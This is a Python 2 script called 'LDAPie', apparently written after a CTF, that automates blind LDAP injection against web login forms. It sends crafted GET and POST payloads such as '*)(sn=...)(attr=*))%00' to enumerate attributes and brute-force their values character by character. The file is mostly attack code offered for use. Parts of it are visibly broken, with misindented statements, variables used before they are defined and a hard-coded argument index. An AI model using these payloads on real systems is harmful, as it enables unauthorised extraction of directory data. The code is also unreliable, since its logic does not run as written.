#/usr/bin/env python2
#Title: LDAPie
#Author: Tepidangler
#Date: Today
#Description: A tool to bruteforce LDAP attributes and Values on a webapp that makes LDAP queries using both POST and
#	      GET requests. I got the idea for this tool while doing a CTF ;) and making manual Blind LDAPi's now I'm
#	      passing the savings onto YOUUUUU!!!!!!!!! XD

# importing the modules we'll need

import requests, sys, time, string
import argparse as ap

#Let's make things look a little bit better and easier for people to use
print("""\033[1;36m
#####################################################
	 Welcome to LDAPie by Tepidangler
	 Email: tepidangler@protonmail.com
	 Info: This is a program created out of 
               necessity since I couldn't find a
	       program that did LDAP injection
               via POST requests
         TODO: loosen up request params, automate
               IF URL IS NOT SET YOU WILL GET FALSE NEGATIVES :)
#####################################################
USAGE: python LDAPie.py <opts> <user> <get/post> <url> 
-h for help
""")

# making our class

class LDAPie:

#Initialize the program
    def __init__(self,filename):
        self.filename = filename

#Function to take the file from sys args, read them, then we'll use that to build our request
    def post(self,filename,user,url):

        with open(wordlist, 'r') as f:
            a = f.read().splitlines()
            for x in a:
                data = {'username':user+'*)(sn='+user+')('+x+'=*))%00'}
                h = {'Connection':'Close'}
                time.sleep(5)
                r = requests.post(url,headers=h,data=data)
                l = r.text
                if len(l) not in [cl1,cl]:
                    return("\033[1;32mVALID LDAP INJECTION: "+str(data))
            pass

    def get(self,filename,user,url):
        with open(wordlist, 'r') as f:
            a = f.read().splitlines()
            inj = []
            for x in a:
                url = sys.argv[7]+'='+user+'*)(sn='+user+')('+x+'=*))%00'
                r = requests.get(url)
                time.sleep(5)
                l = r.text
                print('\033[1;31m'+url)
                if len(l) != cl1:
                   inj.append(str(x))
            return inj

    def bruteforce(self,inj,user,url):
        val = None
        char = string.letters+string.digits+"""~!@#$%^&*()`-_=+[{]}\|;:'",<.>/?"""
        url = sys.argv[7]
        for i in range(1,100):
            for x in char:
                bf = requests.get(url+inj+val+x+"*))%00")
                print(bf)
    if user in r.content:
        val += x
        print("The Value For "+inj+" is "+val)
#        break

#main
#SHOUT OUT TO RASTAMOUSE FOR THIS METHOD ON HOW TO HANDLE COMMANDLINE ARGS
post = False
get = False
wordlist = None
url = None
user = None
inj = None
arg_index = 0
for arg in sys.argv:
    if (arg == "-h"):
        print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-user			username
-h                      help
""")
        sys.exit(0)
    elif (arg == "-w"):
        wordlist = sys.argv[arg_index + 1]
    elif (arg == "-u"):
        url = sys.argv[arg_index + 1]
    elif (arg == "-p"):
        post = True
    elif (arg == "-g"):
        get = True
    elif (arg == "-user"):
        user = sys.argv[arg_index + 1]
    arg_index = arg_index + 1

d = {'username':'test*)(=*))(&=void)'}
r = requests.post(url,data=d)
l = r.text
cl = len(l)
rr = requests.get(url+'=asdfadsf')
l1 = rr.text
cl1 = len(l1)

m = LDAPie(wordlist)
if post == True:
    p = m.post(wordlist,user,url)
#    m.bruteforce(inj,user,url)
    pass
if get == True:
    g = m.get(wordlist,user,url)
#    m.bruteforce(inj,user,url)
    pass

elif get == False or post == False:
    print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-user			username
-h                      help
""")
elif wordlist == None or url == None:
    print("""
-w                      path/to/wordlist 
-u                      path/to/vuln/service 
-p                      post/-g get 
-user			username
-h                      help
""")

m.bruteforce(inj,user,url)
print("The Value For "+x+" is "+val)
